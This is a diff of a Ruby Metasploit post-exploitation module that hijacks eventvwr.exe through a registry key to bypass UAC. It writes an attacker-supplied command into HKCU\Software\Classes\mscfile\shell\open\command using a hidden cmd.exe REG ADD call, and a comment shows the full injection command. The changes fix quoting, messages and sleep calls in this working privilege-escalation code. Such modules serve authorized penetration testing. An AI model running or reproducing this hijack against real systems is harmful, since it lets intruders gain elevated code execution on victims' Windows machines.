@@ -150,7 +150,7 @@ def ls_stage1
   vul_serve = '%WINDIR%\\System32\\eventvwr.exe'              # vulnerable soft to be hijacked
   reg_clean = 'REG ADD HKCU\\Software\\Classes\\mscfile'      # registry hive to be clean in the end
   regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
-  comm_inje = '#{regi_hive} /ve /t REG_SZ /d #{exec_comm} /f' # injection registry oneliner command
+  comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['CMD_COMMAND'] == 'nil'
@@ -158,8 +158,8 @@ def ls_stage1
     print_warning("Please set CMD_COMMAND option!")
     return nil
   else
-    print_status("Hijacking eventvwr.exe software!")
-    sleep(1.5)
+    print_status("Hijacking eventvwr.exe process!")
+    Rex::sleep(1.5)
   end
 
 
@@ -167,19 +167,20 @@ def ls_stage1
     print_warning("Reading service hive registry keys...")
     sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-      print_good(" Remote registry key found!")
-      sleep(1.0)
+      print_good(" Remote registry hive key found!")
+      Rex::sleep(1.0)
     else
-       print_error("ABORT: post-module cant registry key needed...")
-       sleep(1.0)
+       print_error("ABORT: post-module cant find the registry key needed...")
+       Rex::sleep(1.0)
        return nil
     end
 
 
-    # execute hijacking...
-    print_good(" Execute => sc stop #{s_name}")
-    r = session.sys.process.execute("#{comm_path} #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
-    sleep(2.0)
+ # execute hijacking...
+ # REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /t REG_SZ /d \"%WINDIR%\\System32\\cmd.exe /c start notepad.exe\" /f
+ print_good(" Hijacking proccess to gain code execution!")
+ r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
+ Rex::sleep(2.0)
 
 
 end
